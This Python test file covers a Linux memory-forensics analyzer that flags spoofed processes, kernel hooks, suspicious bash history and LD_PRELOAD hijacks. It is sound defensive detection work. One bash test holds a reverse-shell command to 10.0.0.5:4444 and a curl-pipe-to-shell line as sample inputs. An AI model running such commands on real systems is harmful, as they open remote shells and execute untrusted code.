"""Tests for the vol3 2.28 migration: behavioral adjudication of
linux.malware.process_spoofing, and the ftrace/tracepoint anomaly handlers.

These verify the FP-calibration proven against the live ubuntu-main image: raw
Comm_Spoofed / Cmdline_Spoofed flags (benign on a clean host) are NOT emitted,
while Exe_Deleted and kernel-thread masquerade ARE.
"""
import sys
from conftest import LINUX_HUNT, ROOT

sys.path.insert(0, LINUX_HUNT)
import analyze_memory_linux as m  # noqa: E402

if ROOT not in sys.path:
    sys.path.insert(0, ROOT)
from playbooks.linux.investigation.engine import _parse_pid_target  # noqa: E402


def types(findings):
    return {f["Type"] for f in findings}


# --- process_spoofing: behavioral adjudication --------------------------------

def test_benign_comm_spoof_not_flagged():
    """A python daemon (comm != exe basename) is benign and must NOT be flagged -
    this is the 23-FP case from the live image."""
    rows = [
        {"PID": 1825, "Comm": "networkd-dispat", "Exe_Path": "/usr/bin/python3.13",
         "Comm_Spoofed": True, "Cmdline_Spoofed": True, "Exe_Deleted": False},
        {"PID": 1, "Comm": "systemd", "Exe_Path": "/usr/lib/systemd/systemd",
         "Comm_Spoofed": False, "Cmdline_Spoofed": True, "Exe_Deleted": False},
    ]
    assert m.analyze_process_spoofing(rows) == []


def test_deleted_exe_flagged_high():
    rows = [{"PID": 4444, "Comm": "nginx", "Exe_Path": "/tmp/x",
             "Comm_Spoofed": False, "Cmdline_Spoofed": False, "Exe_Deleted": True}]
    out = m.analyze_process_spoofing(rows)
    assert "Process Running Deleted Binary (memory)" in types(out)
    assert out[0]["Severity"] == "High"


def test_kernel_thread_masquerade_flagged_high():
    """comm presents as a kernel thread but has a userland exe -> masquerade."""
    rows = [{"PID": 31337, "Comm": "kworker/0:2", "Exe_Path": "/dev/shm/implant",
             "Comm_Spoofed": True, "Cmdline_Spoofed": False, "Exe_Deleted": False}]
    out = m.analyze_process_spoofing(rows)
    assert "Kernel-Thread Name Masquerade (memory)" in types(out)
    assert out[0]["Severity"] == "High"


def test_spoof_from_implant_dir_flagged():
    rows = [{"PID": 2222, "Comm": "evil", "Exe_Path": "/var/tmp/dropper",
             "Comm_Spoofed": True, "Cmdline_Spoofed": False, "Exe_Deleted": False}]
    out = m.analyze_process_spoofing(rows)
    assert "Spoofed Process From Implant Dir (memory)" in types(out)


def test_real_kthread_not_flagged():
    """An actual kernel thread (no exe) is not a masquerade."""
    rows = [{"PID": 2, "Comm": "kthreadd", "Exe_Path": "N/A",
             "Comm_Spoofed": False, "Cmdline_Spoofed": False, "Exe_Deleted": False}]
    assert m.analyze_process_spoofing(rows) == []


# --- ftrace / tracepoints: anomaly-only passthrough ---------------------------

def test_ftrace_hook_row_flagged():
    rows = [{"Address": 0xffff1234, "Callback Symbol": "UNKNOWN", "Module": "-"}]
    out = m.analyze_ftrace(rows)
    assert "Ftrace Kernel Hook (memory)" in types(out)
    assert out[0]["Severity"] == "High"


def test_tracepoint_hook_row_flagged():
    rows = [{"Tracepoint": "sys_enter_getdents64", "Callback Symbol": "UNKNOWN"}]
    out = m.analyze_tracepoints(rows)
    assert "Tracepoint/Kprobe Hook (memory)" in types(out)


def test_ftrace_clean_no_rows():
    assert m.analyze_ftrace([]) == []
    assert m.analyze_tracepoints(None) == []


# --- analyze_bash: structure, not bare /tmp references ------------------------

def test_bash_benign_tmp_references_not_flagged():
    """The exact FP set from the ubuntu-main run: bare /tmp references are benign."""
    rows = [{"Command": c, "PID": 72987} for c in
            ("ls /tmp/claude-1000/", "cd /tmp/", "cat /tmp/test_run_phase4_zero3.txt",
             "rm -rf /tmp/claude-1000/", "tail -f /tmp/k8s_run.log")]
    assert m.analyze_bash(rows) == []


def test_bash_real_attacks_flagged_high():
    for cmd in ("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "curl http://x/a.sh | sh"):
        out = m.analyze_bash([{"Command": cmd, "PID": 9}])
        assert out and out[0]["Severity"] == "High", cmd


def test_bash_implant_exec_is_medium():
    out = m.analyze_bash([{"Command": "/tmp/payload", "PID": 9}])
    assert out and out[0]["Severity"] == "Medium"


def test_bash_sudo_su_is_medium_not_high():
    """`sudo su` is privilege escalation but routine admin - Medium, not a scary High."""
    out = m.analyze_bash([{"Command": "sudo su", "PID": 9}])
    assert out and out[0]["Severity"] == "Medium"


# --- analyze_envars: LD_PRELOAD provenance, not blanket High ------------------

def test_envars_benign_soname_is_low():
    """LD_PRELOAD=libmozsandbox.so (Firefox sandbox) is benign - Low, not High."""
    out = m.analyze_envars([{"KEY": "LD_PRELOAD", "VALUE": "libmozsandbox.so",
                             "PID": 4751, "COMM": "forkserver"}])
    assert out and out[0]["Severity"] == "Low"


def test_envars_writable_preload_is_high():
    out = m.analyze_envars([{"KEY": "LD_PRELOAD", "VALUE": "/tmp/evil.so",
                             "PID": 9, "COMM": "sshd"}])
    assert out and out[0]["Severity"] == "High"
    assert out[0]["Type"] == "Linker Hijack (memory)"


# --- pscallstack: TID -> owning-PID resolution ---------------------------------
# pscallstack's own TreeGrid has no PID/TGID column (only TID) -- without a
# --threads pslist run's tid_pid_map, a stack-anomaly finding on a non-leader
# thread has no owning PID the investigation engine's Target parser can find,
# and silently misroutes to the host-scope verdict instead of the process
# that actually owns the thread.

def test_tid_pid_map_builds_from_threaded_pslist_rows():
    rows = [{"PID": 1234, "TID": 1234, "PPID": 1, "COMM": "nginx"},
           {"PID": 1234, "TID": 1240, "PPID": 1, "COMM": "nginx"}]
    tid_map = m._tid_pid_map(rows)
    assert tid_map["1240"] == ("1234", "nginx")
    assert tid_map["1234"] == ("1234", "nginx")


def test_pscallstack_resolves_owning_pid_when_map_available():
    rows = [{"TID": 1240, "Comm": "nginx", "Module": "", "Name": "",
            "Address": "0x7f0000", "Value": "0x7f1234"}]
    tid_map = {"1240": ("1234", "nginx")}
    out = m.analyze_pscallstack(rows, tid_map)
    assert len(out) == 1
    assert out[0]["Target"] == "PID 1234 (nginx) TID 1240"
    assert "unresolved" not in out[0]["Details"]


def test_pscallstack_findings_route_to_owning_pid_not_host_scope():
    """The whole point of resolving the PID: the investigation engine's
    Target parser must actually recover it, not just have it present as text."""
    rows = [{"TID": 1240, "Comm": "nginx", "Module": "", "Name": "",
            "Address": "0x7f0000", "Value": "0x7f1234"}]
    tid_map = {"1240": ("1234", "nginx")}
    out = m.analyze_pscallstack(rows, tid_map)
    pid, proc = _parse_pid_target(out[0]["Target"], out[0]["Details"])
    assert pid == 1234
    assert proc == "nginx"


def test_pscallstack_degrades_to_tid_only_without_map():
    """No --threads pslist data available (map empty/missing) -- keep the
    TID-only form with an explicit note rather than silently fabricating
    a PID attribution that was never actually resolved."""
    rows = [{"TID": 1240, "Comm": "nginx", "Module": "", "Name": "",
            "Address": "0x7f0000", "Value": "0x7f1234"}]
    out = m.analyze_pscallstack(rows)
    assert out[0]["Target"] == "nginx (TID 1240)"
    assert "owning PID unresolved" in out[0]["Details"]


def test_pscallstack_resolved_module_symbol_not_flagged():
    rows = [{"TID": 1240, "Comm": "nginx", "Module": "libc.so.6", "Name": "malloc",
            "Address": "0x7f0000", "Value": "0x7f1234"}]
    assert m.analyze_pscallstack(rows) == []
